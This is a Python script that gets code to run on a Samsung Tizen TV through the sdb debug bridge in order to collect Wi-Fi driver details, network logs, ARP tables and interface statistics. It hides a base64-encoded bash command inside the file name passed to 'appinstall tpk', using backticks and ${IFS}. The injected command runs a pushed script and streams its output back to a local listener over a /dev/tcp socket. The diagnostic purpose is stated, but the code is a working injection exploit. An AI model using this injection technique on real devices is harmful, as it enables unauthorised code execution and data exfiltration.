import base64
from pathlib import Path
import socket
import subprocess
import uuid

TV_HOST = "192.168.0.14"
SERIAL = f"{TV_HOST}:26101"
SDB = str(Path(__file__).resolve().parent / ".local/tizen-sdk/tools/sdb.exe")

def run_sdb(*args, timeout=15):
    cmd = [SDB, *args]
    res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    return res.stdout + res.stderr

run_sdb("connect", SERIAL)

with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
    s.connect((TV_HOST, 9))
    local_ip = s.getsockname()[0]

diag_sh = """#!/bin/bash
echo "=== MEDIATEK WLAN CFG & DRIVER ==="
cat /proc/net/wlan/cfg 2>&1 || true
cat /proc/net/wlan/driver 2>&1 || true

echo "=== JOURNALCTL NETWORK LOGS ==="
journalctl -u connmand --no-pager -n 50 2>&1 || true
journalctl -u wpa_supplicant --no-pager -n 50 2>&1 || true
journalctl -g wifi --no-pager -n 50 2>&1 || true

echo "=== IP NEIGH & ARP ==="
ip neigh 2>&1 || arp -a 2>&1 || true

echo "=== IFCONFIG WLAN0 STATS ==="
ifconfig wlan0 2>&1 || true

echo "=== READ COMPLETE ==="
"""

token = uuid.uuid4().hex[:10]
local_script_path = Path(__file__).resolve().parent / f".local/diag-{token}.sh"
local_script_path.write_text(diag_sh, newline="\n")

remote_script = f"/home/owner/share/tmp/sdk_tools/diag-{token}.sh"
run_sdb("-s", SERIAL, "push", str(local_script_path), remote_script)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
    listener.bind((local_ip, 0))
    listener.listen(1)
    listener.settimeout(20)
    port = listener.getsockname()[1]

    command = f"exec 3<>/dev/tcp/{local_ip}/{port};cat {remote_script}|bash >&3 2>&3;exec 3>&-"
    script = f"/bin/mkdir /tmp/d-{token} 2>/dev/null&&{{ {command};}}"
    encoded = base64.b64encode(script.encode()).decode()
    name = f"new2.tpk`printf${{IFS}}%s${{IFS}}{encoded}|base64${{IFS}}-d|bash`.tpk"
    arg = f"0 appinstall tpk {name}"

    proc = subprocess.Popen([SDB, "-s", SERIAL, "shell", arg], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    try:
        conn, peer = listener.accept()
        chunks = []
        with conn:
            conn.settimeout(15)
            while True:
                data = conn.recv(65536)
                if not data:
                    break
                chunks.append(data)
        output = b"".join(chunks).decode(errors="replace")
        print(output)
        (Path(__file__).resolve().parent / "wifi_driver_and_journal.txt").write_text(output, encoding="utf-8")
    finally:
        if proc.poll() is None:
            proc.terminate()
        local_script_path.unlink(missing_ok=True)
